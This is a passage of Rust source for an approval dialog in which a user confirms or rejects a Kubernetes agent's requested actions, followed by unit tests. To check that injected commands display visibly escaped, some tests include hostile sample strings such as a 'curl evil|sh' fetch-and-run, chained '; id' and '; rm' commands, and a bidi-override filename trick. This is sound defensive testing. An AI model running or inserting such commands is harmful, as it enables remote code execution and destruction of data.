                                this.child(field(t!("agent-field-node"), node, label_width, cx))
                            })
                            .when_some(grant.as_ref(), |this, grant| {
                                this.child(field(
                                    t!("agent-field-right"),
                                    grant.to_string(),
                                    label_width,
                                    cx,
                                ))
                            })
                            .when_some(helm.as_ref(), |this, helm| {
                                this.child(field(
                                    t!("agent-field-release"),
                                    helm.release.clone(),
                                    label_width,
                                    cx,
                                ))
                                .child(field(
                                    t!("agent-field-chart"),
                                    helm.chart.clone(),
                                    label_width,
                                    cx,
                                ))
                                .when_some(helm.version.clone(), |this, version| {
                                    this.child(field(
                                        t!("agent-field-version"),
                                        version,
                                        label_width,
                                        cx,
                                    ))
                                })
                                .when_some(helm.revision, |this, revision| {
                                    this.child(field(
                                        t!("agent-field-revision"),
                                        revision.to_string(),
                                        label_width,
                                        cx,
                                    ))
                                })
                                // Namespaces besides the release's (#21).
                                .when(!helm.namespaces.is_empty(), |this| {
                                    this.child(field(
                                        t!("agent-field-other-namespaces"),
                                        helm.namespaces.join(", "),
                                        label_width,
                                        cx,
                                    ))
                                })
                                .child(field(
                                    t!("agent-field-runs-as"),
                                    helm.identity.clone(),
                                    label_width,
                                    cx,
                                ))
                            })
                            .when_some(access, |this, (raise, current)| {
                                this.child(field(
                                    t!("agent-field-asks-for"),
                                    super::raise_label(raise),
                                    label_width,
                                    cx,
                                ))
                                .child(field(
                                    t!("agent-field-access-now"),
                                    super::access_label(current),
                                    label_width,
                                    cx,
                                ))
                            })
                            .child(div().text_xs().text_color(theme.muted_foreground).child(t!(
                                "agent-tool-session",
                                tool = request.tool.as_str(),
                                session = request.session_id.as_str()
                            ))),
                    )
                    .children(meaning)
                    .when(source, |this| {
                        this.child(
                            div()
                                .text_sm()
                                .text_color(theme.muted_foreground)
                                .child(request.details.clone()),
                        )
                    })
                    .when_some(helm.as_ref(), |this, helm| {
                        let block = |id: &'static str, title: String, content: AnyElement| {
                            div()
                                .flex()
                                .flex_col()
                                .gap_1()
                                .child(
                                    div()
                                        .text_xs()
                                        .text_color(theme.muted_foreground)
                                        .child(title),
                                )
                                .child(
                                    div()
                                        .id(id)
                                        .max_h(px(160.))
                                        .overflow_y_scroll()
                                        .p_2()
                                        .rounded_md()
                                        .bg(theme.muted)
                                        .font_family(theme.mono_font_family.clone())
                                        .text_xs()
                                        .text_color(theme.foreground)
                                        .child(content),
                                )
                        };
                        // How the release's values change (#22), masked.
                        this.children(values_diff)
                            .when(!helm.values.trim().is_empty(), |this| {
                                // With a values diff the whole values are folded.
                                if helm.values_diff.trim().is_empty() || show_values {
                                    this.child(block(
                                        "confirm-helm-values",
                                        t!("agent-helm-values"),
                                        helm.values.clone().into_any_element(),
                                    ))
                                } else {
                                    this.child(
                                        div().child(
                                            Button::new("confirm-show-values")
                                                .ghost()
                                                .xsmall()
                                                .label(t!("agent-helm-values-show"))
                                                .on_click(cx.listener(|this, _, _, cx| {
                                                    this.show_values = true;
                                                    cx.notify();
                                                })),
                                        ),
                                    )
                                }
                            })
                            .when(!helm.objects.is_empty(), |this| {
                                this.child(block(
                                    "confirm-helm-objects",
                                    t!("agent-helm-objects"),
                                    helm.objects.join("\n").into_any_element(),
                                ))
                            })
                    })
                    .when(access.is_some(), |this| {
                        this.child(div().text_sm().text_color(theme.muted_foreground).child(t!(
                            "agent-access-details",
                            context = request.context.as_str()
                        )))
                        .child(
                            div()
                                .flex()
                                .flex_col()
                                .gap_1()
                                .child(
                                    Checkbox::new("confirm-always")
                                        .label(t!("agent-always"))
                                        .checked(always)
                                        .on_click(cx.listener(|this, checked: &bool, _, cx| {
                                            this.always = *checked;
                                            cx.notify();
                                        })),
                                )
                                .child(
                                    div()
                                        .text_xs()
                                        .text_color(if always {
                                            theme.warning
                                        } else {
                                            theme.muted_foreground
                                        })
                                        .child(t!(
                                            "agent-always-note",
                                            context = request.context.as_str()
                                        )),
                                ),
                        )
                    })
                    .when_some(degraded, |this, warning| {
                        this.child(warning_block(
                            t!("agent-limits-off"),
                            vec![warning, t!("agent-limits-off-note")],
                            theme.warning,
                            cx,
                        ))
                    })
                    .when(client_only && !degraded_shown, |this| {
                        this.child(
                            div()
                                .text_xs()
                                .text_color(theme.warning)
                                .child(t!("agent-client-only")),
                        )
                    })
                    .children(as_user_block)
                    .children(show_all_objects)
                    .children(as_user_tick)
                    .children(dangerous)
                    .children(acknowledge)
                    .children(on_host)
                    .children(diff_cut)
                    .children(details),
            )
            // Next to the buttons, in sight without scrolling.
            .children(remember_tick)
            .child(
                div()
                    .flex()
                    .items_center()
                    .gap_2()
                    .child(
                        div()
                            .flex_1()
                            .text_xs()
                            .text_color(theme.muted_foreground)
                            .child(if queued > 0 {
                                t!("agent-auto-reject-queued", left = left, queued = queued)
                            } else {
                                t!("agent-auto-reject", left = left)
                            }),
                    )
                    .child(
                        Button::new("confirm-reject")
                            .outline()
                            .small()
                            .label(reject)
                            .on_click(cx.listener(|this, _, window, cx| {
                                this.answer(
                                    ConfirmationDecision::Rejected {
                                        reason: Some("rejected by the user".into()),
                                    },
                                    window,
                                    cx,
                                )
                            })),
                    )
                    .child(
                        Button::new("confirm-approve")
                            .small()
                            .label(approve)
                            .disabled(approve_blocked)
                            .map(|button| {
                                if has_dangerous {
                                    button.danger()
                                } else {
                                    button.primary()
                                }
                            })
                            .on_click(cx.listener(move |this, _, window, cx| {
                                if approve_blocked {
                                    return;
                                }
                                let decision = if this.always {
                                    ConfirmationDecision::ApprovedAlways
                                } else if remember {
                                    ConfirmationDecision::ApprovedForSession
                                } else {
                                    ConfirmationDecision::Approved
                                };
                                this.answer(decision, window, cx)
                            })),
                    ),
            )
    }
}

#[cfg(test)]
mod tests {
    use super::{
        ArgPart, DiffKind, MAX_ROW_BYTES, SystemNotice, VISIBLE_SPACE, arg_parts, arg_text,
        cut_lines, details_are_a_diff, diff_rows,
    };
    use kubach_mcp::{ConfirmationRequest, DiffCut, RequestKind};

    /// Only a new question with the window hidden or not focused posts
    /// (#102), and only what was posted is retracted.
    #[test]
    fn a_system_notice_goes_out_once_and_only_away_from_the_window() {
        let mut notice = SystemNotice::default();
        assert!(!notice.should_post(1, true, true), "the user is there");
        assert!(!notice.should_retract());
        assert!(
            !notice.should_post(1, false, true),
            "leaving the window does not repeat an old question"
        );
        assert!(notice.should_post(2, false, true));
        assert!(!notice.should_post(2, false, true), "already told");
        assert!(notice.should_retract());
        assert!(!notice.should_retract());
        assert!(!notice.should_post(3, false, false), "turned off");
        assert!(!notice.should_retract());
        assert!(!notice.should_post(3, false, true), "not told late");
    }

    fn text(s: &str) -> ArgPart {
        ArgPart::Text(s.into())
    }

    fn escape(s: &str) -> ArgPart {
        ArgPart::Escape(s.into())
    }

    fn shown(arg: &str) -> String {
        arg_text(&arg_parts(arg)).0
    }

    #[test]
    fn plain_arguments_stay_as_they_are() {
        assert_eq!(arg_parts("ls"), [text("ls")]);
        assert_eq!(
            arg_parts("cat /etc/os-release; id"),
            [text("cat /etc/os-release; id")]
        );
        assert_eq!(arg_parts("привет 世界"), [text("привет 世界")]);
        assert_eq!(arg_parts(""), [escape("(empty)")]);
    }

    #[test]
    fn line_breaks_and_tabs_are_spelled_out() {
        assert_eq!(
            arg_parts("ls -la\n\n; curl evil|sh"),
            [text("ls -la"), escape("\\n\\n"), text("; curl evil|sh")]
        );
        assert_eq!(arg_parts("a\tb"), [text("a"), escape("\\t"), text("b")]);
        assert_eq!(shown("a\r\nb"), "a\\r\\nb");
    }

    #[test]
    fn invisible_and_bidi_characters_are_spelled_out() {
        assert_eq!(
            arg_parts("ls\u{202E}hs.lave"),
            [text("ls"), escape("\\u{202E}"), text("hs.lave")]
        );
        assert_eq!(shown("a\u{200B}b"), "a\\u{200B}b");
        assert_eq!(shown("\x1b[2K"), "\\u{001B}[2K");
        assert_eq!(shown("\u{7f}"), "\\u{007F}");
        assert_eq!(shown("a\u{2066}b\u{2069}"), "a\\u{2066}b\\u{2069}");
        // Spaces that are not ASCII spaces.
        assert_eq!(shown("a\u{00A0}b\u{3000}"), "a\\u{00A0}b\\u{3000}");
    }

    #[test]
    fn edge_and_repeated_spaces_are_visible() {
        let s = VISIBLE_SPACE.to_string();
        assert_eq!(arg_parts("echo hi"), [text("echo hi")]);
        assert_eq!(
            arg_parts("ls "),
            [text("ls"), escape(&s)],
            "a trailing space"
        );
        assert_eq!(arg_parts(" ls"), [escape(&s), text("ls")]);
        assert_eq!(
            arg_parts("ls   ; rm"),
            [text("ls"), escape(&s.repeat(3)), text("; rm")]
        );
        assert_eq!(arg_parts("  "), [escape(&s.repeat(2))]);
    }

    #[test]
    fn escape_ranges_point_at_the_escapes() {
        let (shown, ranges) = arg_text(&arg_parts("a\nb "));
        assert_eq!(shown, format!("a\\nb{VISIBLE_SPACE}"));
        let escaped: Vec<&str> = ranges.iter().map(|r| &shown[r.clone()]).collect();
        assert_eq!(escaped, ["\\n", &VISIBLE_SPACE.to_string()]);
    }

    #[test]
    fn objects_are_counted_by_kind_in_order() {
        let objects = [
            "CustomResourceDefinition a.cert-manager.io",
            "ClusterRole cert-manager-view",
            "CustomResourceDefinition b.cert-manager.io",
            "Role leader (namespace kube-system)",
        ]
        .map(String::from);
        assert_eq!(
            super::kind_counts(&objects),
            "CustomResourceDefinition × 2, ClusterRole × 1, Role × 1"
        );
        assert_eq!(super::kind_counts(&[]), "");
    }

    #[test]
    fn diff_rows_take_the_colors_of_their_lines() {
        let rows = diff_rows("--- a\n+++ b\n@@ -1,3 +1,3 @@\n same\n-old\n+new\n\n");
        let kinds: Vec<DiffKind> = rows.iter().map(|row| row.kind).collect();
        assert_eq!(
            kinds,
            [
                DiffKind::Header,
                DiffKind::Header,
                DiffKind::Hunk,
                DiffKind::Context,
                DiffKind::Removed,
                DiffKind::Added,
                DiffKind::Context,
            ]
        );
        assert_eq!(rows[5].text.as_ref(), "+new");
        assert_eq!(rows[6].text.as_ref(), " ", "an empty line keeps its height");
    }

    /// A diff of megabytes loses nothing on its way to the rows (#137), and
    /// a line of a megabyte does not become one text.
    #[test]
    fn a_large_diff_keeps_every_line_in_bounded_rows() {
        let line = |n: usize| format!("+  key{n}: \"value {n} — значение\"");
        let mut text: String = (0..100_000).map(|n| line(n) + "\n").collect();
        let long = format!("-  blob: {}", "é".repeat(600_000));
        text.push_str(&long);
        text.push('\n');
        assert!(text.len() > 5 * 1024 * 1024);
        let rows = diff_rows(&text);
        assert_eq!(rows[99_999].text.as_ref(), line(99_999));
        assert!(rows.iter().all(|row| row.text.len() <= MAX_ROW_BYTES));
        let pieces = &rows[100_000..];
        assert!(pieces.len() > 600, "{}", pieces.len());
        assert!(pieces.iter().all(|row| row.kind == DiffKind::Removed));
        let joined: String = pieces.iter().map(|row| row.text.as_ref()).collect();
        assert_eq!(joined, long);
    }

    #[test]
    fn a_cut_diff_says_how_much_and_what_is_hidden() {
        let (title, lines) = cut_lines(&DiffCut {
            shown_bytes: 8 * 1024 * 1024,
            total_bytes: 11 * 1024 * 1024,
            hidden_lines: 70_000,
            objects: vec!["Deployment web".into(), "ConfigMap web".into()],
            more_objects: 12,
        });
        assert!(
            title.contains("8.0 MB") && title.contains("11.0 MB"),
            "{title}"
        );
        assert!(
            lines[0].contains("70") && lines[0].contains("3.0 MB"),
            "{lines:?}"
        );
        assert!(
            lines[1].contains("Deployment web, ConfigMap web"),
            "{lines:?}"
        );
        assert!(lines[2].contains("12"), "{lines:?}");
        // Nothing to name: no empty line about objects.
        let (_, lines) = cut_lines(&DiffCut {
            shown_bytes: 1,
            total_bytes: 2,
            hidden_lines: 1,
            ..DiffCut::default()
        });
        assert_eq!(lines.len(), 1);
    }

    #[test]
    fn only_a_change_shows_its_details_as_a_diff() {
        let request = |kind: RequestKind, details: &str| ConfirmationRequest {
            kind,
            session_id: "s".into(),
            context: "minikube".into(),
            client: "agent".into(),
            tool: "apply".into(),
            namespace: "web".into(),
            summary: String::new(),
            details: details.into(),
            dangerous: Vec::new(),
            mode: kubach_mcp::SessionMode::ClientOnly,
            allow_remember: false,
        };
        assert!(details_are_a_diff(&request(RequestKind::Call, "+a: 1\n")));
        assert!(!details_are_a_diff(&request(RequestKind::Call, " \n")));
        let exec = RequestKind::Exec {
            command: vec!["ls".into()],
        };
        assert!(!details_are_a_diff(&request(exec, "ls")));
        let source = RequestKind::ChartSource {
            source: "oci://example".into(),
        };
        assert!(!details_are_a_diff(&request(
            source,
            "Until the session ends"
        )));
    }
}
